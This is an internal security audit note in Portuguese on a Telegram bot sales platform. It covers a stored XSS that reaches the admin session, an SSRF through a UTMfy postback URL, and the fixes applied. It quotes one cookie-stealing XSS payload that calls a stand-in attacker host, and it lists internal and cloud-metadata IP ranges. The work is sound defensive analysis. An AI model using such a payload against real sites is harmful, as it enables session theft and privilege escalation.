# Varredura 09 — XSS que atinge sessão do admin, SSRF via postback UTMfy

Data: 2026-09-16 (pós varredura 08). Rodada de investigação pura — nenhuma correção aplicada. Foco: SSRF, open redirect, injeção de cabeçalho de e-mail, IDOR em endpoints ainda não cobertos, XSS armazenado em campos mais novos.

## 🔴 Alta prioridade

### 1. XSS armazenado que atinge a sessão do ADMIN via modal "Detalhes" em `admin/usuarios.php` ✅ Corrigido

Cadeia completa, confirmada ponta a ponta:

1. **Fonte controlável pelo dono de bot** — nome de fluxo (`api.php::salvar_fluxo`, só passa por `sanitizarTexto()` que faz `trim`+corta tamanho, não remove tags), título de grupo do Telegram (`webhook.php:652/657`, texto livre de quem administra o grupo), `bots.primeiro_nome` (vem do `getMe` do Telegram/BotFather, texto livre).
2. **Armazenamento** — `funcoes/log.php` grava esse texto cru em `atividades.descricao`, sem tratamento.
3. **Leitura** — `funcoes/usuario.php::obterDetalhesUsuario()` devolve `bots[].nome` e `logs[].descricao`/`.titulo` sem escapar.
4. **Saída sem escape** — `ajax/detalhes_usuario.php` faz `echo json_encode($dados)` cru, e o JS de `admin/usuarios.php` (linhas ~473-495) injeta isso via **`innerHTML`**, sem nenhum `escaparHtml()`/`textContent`:
   ```js
   div.innerHTML = `... <strong>${bot.nome}</strong> ...`;
   li.innerHTML  = `... <span class="log-action">${log.titulo || log.tipo}</span>
                        <span class="log-desc">${log.descricao || ''}</span> ...`;
   ```

**Por que é grave:** a varredura 05 já tinha confirmado `htmlspecialchars()` em todos os pontos de exibição pro admin (`leads.php`, `index.php`, `admin/transacoes.php`, `usuarios.php`) — esse modal específico é a exceção, porque usa `innerHTML` no JS em vez de escapar no PHP. Um dono de bot mal-intencionado nomeia um fluxo (ou renomeia um grupo do Telegram onde o bot está) com um payload tipo `<img src=x onerror="fetch('https://attacker.tld/x?c='+document.cookie)">`. Quando o **admin da plataforma** abre "Detalhes" desse usuário (ação normal de suporte/moderação), o script roda na sessão autenticada do admin — podendo chamar `ajax/adicionar_usuario.php`/`ajax/editar_usuario.php` via `fetch()` usando a sessão do admin automaticamente. Ou seja: um campo de texto livre de qualquer usuário comum vira **escalonamento de privilégio completo** (criar admin novo, promover a própria conta, excluir outro usuário) assim que o admin olhar os detalhes daquela conta.

**Correção recomendada:** trocar os `innerHTML` de `admin/usuarios.php` pelos campos de dado (`bot.nome`, `log.titulo`, `log.descricao`, `log.tipo`) por `textContent`, ou aplicar a mesma função `escaparHtml()` já usada em `lista_bots.js`/`lista_fluxos.js`/`edicao_bot.js` antes de montar o template literal.

### 2. SSRF confirmado — campo "Token ou URL de Postback" da UTMfy ✅ Corrigido

`traqueamento.php` expõe um campo de texto livre, documentado como podendo ser uma URL (placeholder `https://api.utmify.com.br/v1/postback/SEU_TOKEN`), salvo sem qualquer validação de host/esquema em `usuarios_traqueamento.utmfy_token`.

`funcoes/utmfy.php`:
```php
$is_url = filter_var($token, FILTER_VALIDATE_URL);
if ($is_url) {
    $url = $token;   // usado direto no curl_init($url), sem whitelist de host/esquema
    ...
```
O servidor faz um **POST autenticado por ele mesmo** pra essa URL, com payload contendo dados reais do cliente/venda (`email`, `phone`, `ip`, `user_agent`, `first_name`, valor, `transaction_id`, UTMs). Disparado automaticamente em 3 pontos de fluxo real: `webhook.php` (evento `pix_gerado`, todo PIX gerado; evento `compra`, confirmação manual) e `webhook_infopago.php` (evento `compra`, confirmação via gateway).

**Impacto:** o dono do bot configura o campo uma vez e, a cada PIX gerado no próprio bot, o servidor da plataforma bate na URL que ele quiser — `http://127.0.0.1/...`, IP interno da rede da Hostinger, qualquer serviço interno alcançável mas não público. Usa a infraestrutura da plataforma como proxy de reconhecimento de rede interna ou pra mascarar origem de requisição contra terceiro. Bônus: como PII do cliente vai nesse payload, também é vetor de vazamento de dado de cliente se o campo for mal-configurado.

**Correção recomendada:** manter a funcionalidade (é um "postback URL" genuíno), mas antes do `curl_exec`: resolver o host e recusar (log + ignora) se o IP resolvido cair em faixa privada/reservada (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`).

## 🟡 Média prioridade

### 3. Arquivos de teste de gateway acessíveis a qualquer usuário logado (não só admin)

`teste_gateway_infopago.php` e `teste_gateway_infopago_recorrente.php` exigem só `verificarLogin()`, não `verificarAdmin()` — diferente do padrão já estabelecido pros outros arquivos de debug/teste (menu "Debug", protegido por admin). Como o gateway InfoPago usa **credenciais compartilhadas do admin para todos os 700 usuários**, qualquer dono de bot logado consegue disparar cobrança/recorrência real contra a **conta de produção compartilhada** da InfoPago, sem CSRF token nem rate limit, só dando refresh no formulário.

**Risco:** não é fraude financeira direta, mas é abuso do canal compartilhado — polui conciliação financeira do admin e pode esgotar limite de taxa da API compartilhada por todos os 700 usuários.

**Correção recomendada:** trocar `verificarLogin()` por `verificarAdmin()` nos dois arquivos.

> **✅ Resolvido em 2026-09-18 — de outro jeito: os dois arquivos foram apagados.** Numa revisão
> pré-lançamento, vi que continuavam publicados no servidor e que o próprio texto dentro deles já
> dizia "apague este arquivo depois de terminar os testes". Como eram páginas temporárias de
> diagnóstico e nada no projeto linkava pra elas, apagar resolve melhor que proteger — some a
> superfície em vez de restringi-la.

### 4. `enviarEventoFacebook()`/`enviarEventoTikTok()` sem `CURLOPT_TIMEOUT`

Diferente de `funcoes/utmfy.php` (que já tem `CURLOPT_TIMEOUT, 15`), `funcoes/facebook.php` e `funcoes/tiktok.php` fazem `curl_exec` sem timeout definido. Chamado no caminho síncrono de confirmação de pagamento (`webhook.php`/`webhook_infopago.php`) — API lenta do Facebook/TikTok pode segurar um worker PHP-FPM além da conta. Mesma categoria do achado de escala em [[analise-escala-seguranca-vendas]]. Correção trivial.

## 🟢 Conferido e sem problema

- **Open redirect** — todos os `header('Location: ...')` do projeto (`login.php`, `logout.php`, `funcoes/usuario.php`, `cadastro.php`, `admin/index.php`, `admin/ranking.php`, `gateways.php`) usam string fixa ou `$_SERVER['PHP_SELF']` só pra redirecionar pra si mesmo — nunca um parâmetro tipo `?redirect=` vindo do usuário.
- **`links_rastreamento.php`** — não é redirecionador genérico; `gerarUrlLink()` monta sempre `'https://t.me/' . ltrim($bot_username, '@') . '?start=' . urlencode($identificador)` — prefixo fixo, não dá pra injetar `javascript:`/mudar host.
- **Injeção de cabeçalho de e-mail** — único chamador de `enviarEmail()` é `enviarEmailCodigo()`, com assunto/remetente fixos; o `$email` usado já passou por `filter_var(FILTER_VALIDATE_EMAIL)` no cadastro (rejeita `\r`/`\n`). Sem caminho de injeção.
- **IDOR/mass assignment** em `ajax/adicionar_usuario.php`, `editar_usuario.php`, `deletar_usuario.php`, `detalhes_usuario.php` (todos `verificarAdmin()`, esperado); `api.php` (`salvar_bot`, `atualizar_perfil_bot`, `reiniciar_webhook`, `excluir_fluxo`) — filtram por `id_usuario` da sessão; `gateways.php` — todas as ações usam `$_SESSION['usuario_id']`; `configuracao_usuario.php`/`cadastro.php` — não permitem alterar `perfil`.
- **XSS armazenado nos demais pontos pedidos** — `usuarios.apelido_publico` (ranking), campanhas de ranking (admin), `bots.nome`/`descricao` no frontend (`lista_bots.js`, `edicao_bot.js`, `lista_fluxos.js`) — todos usam `htmlspecialchars()`/`escaparHtml()` consistentemente. **Única exceção foi o modal do item 🔴 1.**
- **SSRF em outros candidatos** (`funcoes/facebook.php`, `funcoes/tiktok.php`, `webhook.php`, `webhook_infopago.php`, `infopago_banco.php`, `infopago_cashout.php`) — todos com host fixo (`graph.facebook.com`, `business-api.tiktok.com`, `api.telegram.org`, API da InfoPago); só `pixel_id`/`access_token` interpolados em path/header, nunca o host. Único ponto real de SSRF foi o item 🔴 2.

## Resumo por prioridade

1. ~~🔴 XSS armazenado → sessão do admin via `admin/usuarios.php`~~ **Feito.**
2. ~~🔴 SSRF no campo "Token ou URL de Postback" da UTMfy~~ **Feito.**
3. 🟡 Arquivos de teste de gateway acessíveis a qualquer usuário logado (deveriam exigir admin) — ainda pendente.
4. 🟡 `enviarEventoFacebook`/`enviarEventoTikTok` sem timeout de cURL — ainda pendente.

## Correções aplicadas (2026-09-16)

### 1. XSS armazenado no modal "Detalhes" (`admin/usuarios.php`)

Adicionada a mesma função `escaparHtml()` já usada em `lista_bots.js`/`edicao_bot.js`/`lista_fluxos.js` (escapa `&`, `<`, `>`, `"`, `'`) no início do `<script>` inline do arquivo, e aplicada nos dois pontos que montavam HTML com dado de usuário via `innerHTML`: `bot.nome` (lista de bots do usuário) e `log.titulo`/`log.descricao` (lista de atividades). Os outros campos do modal (`data.nome`, `data.email`) já usavam `innerText`, que não interpreta HTML — não precisaram de mudança.

### 2. SSRF no postback da UTMfy (`funcoes/utmfy.php`)

Nova função `urlPostbackEhSegura(string $url): bool`, chamada logo no início do branch que trata `$token` como URL completa (antes de qualquer `curl_exec`). Ela:
- Exige esquema `http`/`https` (recusa `ftp://`, `file://` etc.).
- Se o host já é um IP literal, valida direto com `filter_var(..., FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)`.
- Se é um hostname, resolve via `dns_get_record` (A e AAAA, com fallback pra `gethostbyname`) e recusa se **qualquer** IP resolvido cair em faixa privada/reservada (loopback, RFC1918, link-local `169.254.0.0/16` — cobre o caso clássico de metadata endpoint de nuvem).
- Se não conseguir resolver nenhum IP, recusa por padrão (não arrisca deixar passar).

Se a URL for recusada, a função retorna erro (`'URL de postback recusada (aponta para host interno/privado).'`) sem fazer nenhuma requisição.

Testado manualmente: `127.0.0.1`, `localhost`, `10.0.0.5`, `192.168.1.10` e `169.254.169.254` (IP de metadata de nuvem, ex. AWS/GCP) bloqueados; `api.utmify.com.br` e `www.google.com` passam normal.

**Limitação conhecida (aceita, proporcional ao risco):** a checagem resolve o DNS uma vez antes do `curl_exec`, que resolve de novo internamente — em teoria um atacante sofisticado poderia trocar o DNS entre as duas resoluções (DNS rebinding) pra escapar da checagem. Não implementei fixação de IP via `CURLOPT_RESOLVE` porque é uma técnica de ataque bem mais elaborada e improvável nesse contexto (abuso de usuário pagante de uma plataforma de bots, não um alvo de pentest avançado); documentando aqui caso vire relevante no futuro.

## Notas relacionadas

- `varredura-05-pagamento-privilegio-xss.md` — base de comparação para XSS já checado (sink diferente: `innerHTML` no JS em vez de `htmlspecialchars()` no PHP, por isso passou despercebido antes).
- `varredura-04-idor.md` — base de comparação para os endpoints de `api.php`.
- [[como-funciona-pagamento-gateway]] — contexto de por que o gateway InfoPago usa credenciais compartilhadas do admin (relevante pro item 3).
- [[analise-escala-seguranca-vendas]] — mesma categoria de achado de timeout/escala (item 4).
- [[pendencias]] — lista consolidada.
